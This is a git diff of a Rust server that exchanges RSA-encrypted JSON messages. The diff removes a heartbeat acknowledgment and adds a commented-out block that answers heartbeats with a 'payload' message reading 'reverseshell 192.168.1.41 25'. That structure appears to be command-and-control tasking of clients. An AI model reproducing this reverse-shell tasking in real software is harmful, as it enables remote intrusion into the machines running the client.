@@ -155,20 +155,7 @@ async fn process (mut user : User, channel_snd : Sender<String>, mut channel_rcv
                 trim_newline(&mut user.username);
                 trim_newline(&mut n);
                 let from_json_message: Message = serde_json::from_str(&n).unwrap();
-                if from_json_message.message_type == "heartbeat"{
-                    let message_to_send = Message {
-                        user_sender: "Server".to_string(),
-                        user_receiver: from_json_message.user_sender,
-                        message_type:  "heartbeat".to_string(),
-                        message_content: "acknowledge".to_string(),
-                    };
-    
-                    // message sending
-                    let json_message = serde_json::to_string(&message_to_send).unwrap();
-                    let enc_data = clt_pub_key.encrypt(&mut rng, PaddingScheme::new_pkcs1v15_encrypt(), json_message.as_bytes()).unwrap();
-                    user.stream.write(&enc_data).await.unwrap();
-                }
-                else if from_json_message.message_type == "login" {
+                if from_json_message.message_type == "login" {
                     let enc_data = clt_pub_key.encrypt(&mut rng, PaddingScheme::new_pkcs1v15_encrypt(), n.as_bytes()).unwrap();
                     user.stream.write(&enc_data).await.unwrap();
                 }
@@ -185,6 +172,17 @@ async fn process (mut user : User, channel_snd : Sender<String>, mut channel_rcv
                 assert_ne!(&dec_data, &data[..n]);
                 println!("read {} bytes", n);
                 println!("Heartbeat recieved");
+                /*
+                let from_json_message: Message = serde_json::from_str(&n).unwrap();
+                if from_json_message.message_type == "heartbeat"{
+                    let message_to_send = Message {
+                        user_sender: "Server".to_string(),
+                        user_receiver: from_json_message.user_sender,
+                        message_type:  "payload".to_string(),
+                        message_content: "reverseshell 192.168.1.41 25".to_string(),
+                    };
+                }
+                */
             }
             Err(_e) => {}
         }
